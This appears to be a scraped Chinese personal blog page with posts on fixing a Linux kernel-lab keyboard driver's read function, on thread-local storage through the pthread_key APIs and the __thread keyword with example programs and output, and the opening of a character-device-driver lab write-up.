file-&gt;private_data;</span><br><span class="line">	<span class="keyword">size_t</span> read = min(BUFFER_SIZE - *offset, size);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flag;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">bool</span> more = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(read == <span class="number">0</span>)&#123;</span><br><span class="line">		printk(<span class="string">&quot;read full&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* TODO 4: read data from buffer */</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;read;i++)&#123;</span><br><span class="line">		spin_lock_irqsave(&amp;data-&gt;lock,flag);</span><br><span class="line">		more = get_char(&amp;ch,data);</span><br><span class="line">		spin_unlock_irqrestore(&amp;data-&gt;lock,flag);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!more)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put_user(ch,user_buffer++))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> read;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个函数有个很明显的问题，就是 Read 的返回值不对（刚开始也没考虑这些问题）</li>
<li>把它修改为以下代码后就没有问题了：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">kbd_read</span><span class="params">(struct file *file,  <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kbd</span> *<span class="title">data</span> =</span> (struct kbd *) file-&gt;private_data;</span><br><span class="line">	<span class="keyword">size_t</span> read = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flag;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">bool</span> more = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(size == <span class="number">0</span>)&#123;</span><br><span class="line">		printk(<span class="string">&quot;read full&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* TODO 4: read data from buffer */</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">		spin_lock_irqsave(&amp;data-&gt;lock,flag);</span><br><span class="line">		more = get_char(&amp;ch,data);</span><br><span class="line">		spin_unlock_irqrestore(&amp;data-&gt;lock,flag);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!more)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put_user(ch,user_buffer++))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		read ++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> read;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/13/Linux%20TLS%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/13/Linux%20TLS%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8/" class="post-title-link" itemprop="url">Linux TLS线程局部存储</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-13 22:03:35 / Modified: 22:04:54" itemprop="dateCreated datePublished" datetime="2022-10-13T22:03:35+08:00">2022-10-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>基础知识</strong></p>
<p>在多线程的程序中，进程中的全局变量与函数内定义的静态(static)变量，是各个线程都可以访问的共享变量，因此往往会有资源条件竞争的问题，常见的处理办法就是使用同步机制来维护资源</p>
<p>线程局部存储（Thread Local Storage，TLS）是一种另类的解决方式：</p>
<ul>
<li>它存储和维护一些线程相关的数据，存储的数据会被关联到当前线程中去，并不需要锁来维护</li>
<li>本质上是为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突 </li>
</ul>
<p><strong>TLS实现方式：API</strong></p>
<p>Linux 中相关的 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_create</span><span class="params">(<span class="keyword">pthread_key_t</span> *key, <span class="keyword">void</span> (*destructor)(<span class="keyword">void</span>*))</span></span>; <span class="comment">/* 构建一个pthread_key_t类型,确实是相当于一个key */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_delete</span><span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>; <span class="comment">/* 注销一个pthread_key_t */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">pthread_getspecific</span><span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>; <span class="comment">/* 将与pthread_key_t相关联的数据读出来 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_setspecific</span><span class="params">(<span class="keyword">pthread_key_t</span> key, <span class="keyword">const</span> <span class="keyword">void</span> *value)</span></span>; <span class="comment">/* 用于将value的副本存储于一数据结构中,并将其与调用线程以及pthread_key_t相关联 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>结构关系图如下：</li>
</ul>
<img src="/2022/10/13/Linux%20TLS%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8/1665655683859.png" class width="1665655683859"> 
<p>本人在实际操作这些 API 时遇到了许多问题，先看一个失败的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_key_t</span> p_key;  </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">(<span class="keyword">void</span> *args)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d is runing in %s\n&quot;</span>,*(<span class="keyword">int</span>*)args,__func__);  </span><br><span class="line">    *(<span class="keyword">int</span>*)args = *(<span class="keyword">int</span>*)args + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d is runing in %s\n&quot;</span>,*(<span class="keyword">int</span>*)args,__func__);  </span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)<span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">pthread_t</span> p[<span class="number">24</span>]; </span><br><span class="line">    pthread_key_create(&amp;p_key,<span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">int</span> *a = (<span class="keyword">int</span>*)pthread_getspecific(p_key);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    pthread_setspecific(p_key, a); </span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;p[i], <span class="literal">NULL</span>,thread_func,a);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line"><span class="number">1</span> is runing in thread_func</span><br><span class="line"><span class="number">2</span> is runing in thread_func</span><br><span class="line"><span class="number">1</span> is runing in thread_func</span><br><span class="line"><span class="number">2</span> is runing in thread_func</span><br><span class="line"><span class="number">3</span> is runing in thread_func</span><br><span class="line"><span class="number">5</span> is runing in thread_func</span><br><span class="line"><span class="number">3</span> is runing in thread_func</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<ul>
<li>位于堆区的 <code>a</code> 本来应该充当 TLS 的作用，但各个线程好像还是共用了同一片空间</li>
<li><code>pthread_setspecific</code> 对主线程进行了绑定，而忽略了其他线程（其实我还有多个测试案例：把 <code>pthread_setspecific</code> 放到线程函数里面，使用不同的 <code>pthread_key_t</code> 变量 …… 但这些操作都失败了）</li>
<li>其实这里是我的理解有误区，认为这些 API 函数会自动帮我为不同的线程复制数据</li>
</ul>
<p>接下来看一个成功的案例：（错误码 errno 的实现原理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_deal_func</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	TASK_NUM	2</span></span><br><span class="line"><span class="keyword">pthread_t</span> global_thread_no[TASK_NUM];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_key_t</span> key;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_once_t</span> key_once = PTHREAD_ONCE_INIT;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">make_key</span><span class="params">()</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>) pthread_key_create(&amp;key, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> * _errno()&#123;</span><br><span class="line">    <span class="keyword">int</span> *ptr;</span><br><span class="line">    (<span class="keyword">void</span>) pthread_once(&amp;key_once, make_key);</span><br><span class="line">    <span class="keyword">if</span> ((ptr = pthread_getspecific(key)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));       </span><br><span class="line">        (<span class="keyword">void</span>) pthread_setspecific(key, ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ptr ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	errno_test *_errno()	</span></span><br><span class="line"><span class="comment">//int errno_test = 0;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	errno_test = <span class="number">100</span>;</span><br><span class="line">	<span class="keyword">int</span> tmp = <span class="number">0</span>,i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; TASK_NUM; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>((tmp=pthread_create(&amp;global_thread_no[i],<span class="literal">NULL</span>,thread_deal_func,&amp;i))!= <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t create thread: %s\n&quot;</span>,strerror(tmp));</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;man thread     ,errno_test:%d\n&quot;</span>,errno_test);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_deal_func</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number = *(<span class="keyword">int</span>*)arg;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		errno_test += <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;thread number:%d,errno_test:%d\n&quot;</span>,number,errno_test);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 TLS：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">1</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">1</span></span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">2</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">2</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">3</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">3</span></span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">4</span></span><br><span class="line">man thread     ,errno_test:<span class="number">100</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">4</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用全局变量：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">101</span></span><br><span class="line">man thread     ,errno_test:<span class="number">101</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">102</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">103</span></span><br><span class="line">man thread     ,errno_test:<span class="number">103</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">104</span></span><br><span class="line">thread number:<span class="number">2</span>,errno_test:<span class="number">105</span></span><br><span class="line">thread number:<span class="number">1</span>,errno_test:<span class="number">106</span></span><br><span class="line">man thread     ,errno_test:<span class="number">106</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 <code>errno_test</code> 看起来像是全局变量，其实是一个函数的返回值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>	errno_test *_errno()</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每次使用 <code>errno_test</code> 时，都会调用 <code>_errno()</code> 函数</li>
<li>在其中会申请与当前线程绑定的变量，并且调用 <code>malloc</code> 为其分配空间：<ul>
<li>对于各个线程来说，这些变量的地址不同了</li>
<li>对于用户来说，各个线程拿到不同的变量，不会相互干扰</li>
</ul>
</li>
</ul>
<p><strong>TLS实现方式：关键字</strong></p>
<p>在 Linux 中还有一种更为高效的线程局部存储方法，就是使用关键字 <code>__thread</code> 来定义变量</p>
<ul>
<li>凡是带有 <code>__thread</code> 的变量，每个线程都拥有该变量的一份拷贝，且互不干扰</li>
<li>线程局部存储中的变量将一直存在，直至线程终止，当线程终止时会自动释放这一存储 </li>
</ul>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__thread <span class="keyword">int</span> var = <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">task_entry</span><span class="params">(<span class="keyword">void</span>* arg)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">int</span> idx = (<span class="keyword">int</span>)arg;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;addr : %p\n&quot;</span>,&amp;var);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread:%d  var = %d\n&quot;</span>, idx, var += idx); </span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;  </span><br><span class="line">    <span class="keyword">pthread_t</span> pid1,pid2;  </span><br><span class="line">    pthread_create(&amp;pid1,<span class="literal">NULL</span>,task_entry,(<span class="keyword">void</span> *)<span class="number">1</span>);  </span><br><span class="line">    pthread_create(&amp;pid2,<span class="literal">NULL</span>,task_entry,(<span class="keyword">void</span> *)<span class="number">2</span>);  </span><br><span class="line">    pthread_join(pid1,<span class="literal">NULL</span>);  </span><br><span class="line">    pthread_join(pid2,<span class="literal">NULL</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test                         </span><br><span class="line">addr : <span class="number">0x7f20b3ebe6fc</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">1</span></span><br><span class="line">addr : <span class="number">0x7f20b36bd6fc</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">2</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">2</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">4</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">6</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">3</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">4</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">8</span></span><br><span class="line">thread:<span class="number">2</span>  var = <span class="number">10</span></span><br><span class="line">thread:<span class="number">1</span>  var = <span class="number">5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>两个线程并不会干扰，而且地址也不同</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/13/Linux-Lab3-Character%20device%20drivers/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/13/Linux-Lab3-Character%20device%20drivers/" class="post-title-link" itemprop="url">Linux-Lab3-Character device drivers</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-13 01:10:24" itemprop="dateCreated datePublished" datetime="2022-10-13T01:10:24+08:00">2022-10-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-14 20:55:38" itemprop="dateModified" datetime="2022-10-14T20:55:38+08:00">2022-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Character device drivers</strong></p>
<p>实验室目标：</p>
<ul>
<li>了解字符设备驱动程序背后的概念</li>
<li>了解可以在字符设备上执行的各种操作</li>
<li>使用等待队列</li>
</ul>
<p>设备驱动程序是与硬件设备交互的内核组件（通常是模块）</p>
<p>在UNIX中有两类设备文件：</p>
<ul>
<li>第一类设备，字符设备：（例如：键盘、鼠标、串行端口、声卡、操纵杆）<ul>
<li>慢速设备</li>
<li>管理少量数据</li>
<li>访问数据不需要频繁的查找查询</li>
<li>通常，这些设备的 Read/Write 是按字节顺序执行</li>
</ul>
</li>
<li>第二类设备，块设备：（例如：硬盘驱动器、光盘、RAM 磁盘、磁带驱动器）<ul>
<li>数据量大</li>
<li>数据按块组织</li>
<li>搜索频繁</li>
<li>对于这些设备，Read/Write 是在数据块级别完成的</li>
</ul>
</li>
</ul>
<p>因此，UNIX 提供了两种设备驱动程序：</p>
<ul>
<li>字符驱动 - character driven </li>
<li>块驱动 - block driven </li>
<li>PS：Linux中还有一种网络驱动 - plot driven（不是本篇文章的重点）</li>
</ul>
<p>对于这两种类型的设备驱动程序，Linux 内核提供了不同的 API，其中大多数参数都有直接含义：</p>
<ul>
<li><code>file</code> 和 <code>inode</code>：标识设备类型文件</li>
<li><code>size</code>：要读取或写入的字节数</li>
<li><code>offset</code>：要读取或写入的位移（将相应更新）</li>
<li><code>user_buffer</code>：从中 Read/Write 的用户缓冲区</li>
<li><code>whence</code>：搜索方式（搜索操作开始的位置）</li>
<li><code>cmd</code> 和 <code>arg</code>：用户发送到 ioctl 调用的参数（IO控制）</li>
</ul>
<p><strong>Majors and Minors</strong></p>
<p>Linux 中，设备具有与之关联的唯一固定标识符，由两部分组成：major and minor</p>
<ul>
<li>major：标识设备的类型（IDE 磁盘、SCSI 磁盘、串行端口等）</li>
<li>minor：标识具体的设备（第一个磁盘、第二个串行端口等）</li>
</ul>
<p>PS：因为物理设备已经被驱动抽象为“在 Linux 上运行的软件”，所以 Linux 可以通过这种方式定位具体的物理设备</p>
<p><strong>Inode and File</strong></p>
